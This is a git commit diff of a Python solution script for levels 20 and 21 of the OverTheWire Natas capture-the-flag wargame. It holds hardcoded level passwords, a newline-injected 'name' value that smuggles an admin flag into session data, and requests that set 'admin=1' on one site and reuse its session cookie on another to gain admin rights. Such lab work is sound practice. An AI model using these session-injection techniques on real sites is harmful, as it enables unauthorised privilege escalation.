1fee2fa1580aeccb016c3a02aba3e2a767127a56
doctormartin67 <celticfans@hotmail.com>
2022-12-02 18:38:48 +0100

    natas21 complete

--- natas/main.py
+++ natas/main.py
@@ -1,43 +1,19 @@
 import sys
 import requests as req
 
-username = "natas20"
-password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
-url = "http://%s.natas.labs.overthewire.org/" % username
+username = "natas21"
+password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
+url = "http://%s-experimenter.natas.labs.overthewire.org/" % username
+url_orig = "http://%s.natas.labs.overthewire.org/" % username
 
-data = {"name": "hello\nadmin 1"}
+data = {"admin": "1", "submit": "Update", "debug": ""}
 s = req.session()
 
-cookie = {"PHPSESSID": "0"}
+r = s.get(url, auth=(username, password), params=data)
+print(r.text)
+print(r.cookies)
 
-def encode(i):
-	s = ""
-	j = int(str(i)[::-1])
-	while j:
-		d = j % 10
-		s += "3" + str(d)
-		j //= 10
-	while not (i % 10):
-		s += "30"
-		i //= 10
-	return s
-
-j = 1
-
-#print(encode(640))
-#sys.exit(0)
-
-while 1:
-	print(j, cookie["PHPSESSID"])
-	r = s.post(url, auth=(username, password), data=data)
-	r = s.get(url, auth=(username, password))
-	print(r.text)
-	"""
-	print(r.cookies)
-	print(r.headers)
-	"""
-	sys.exit(0)
-	if not "regular user" in r.text:
-		print(r.text)
-		break
-	j += 1
+r = s.get(url_orig, auth=(username, password), cookies={"PHPSESSID":
+r.cookies["PHPSESSID"]})
+print(r.text)
+print(r.cookies)
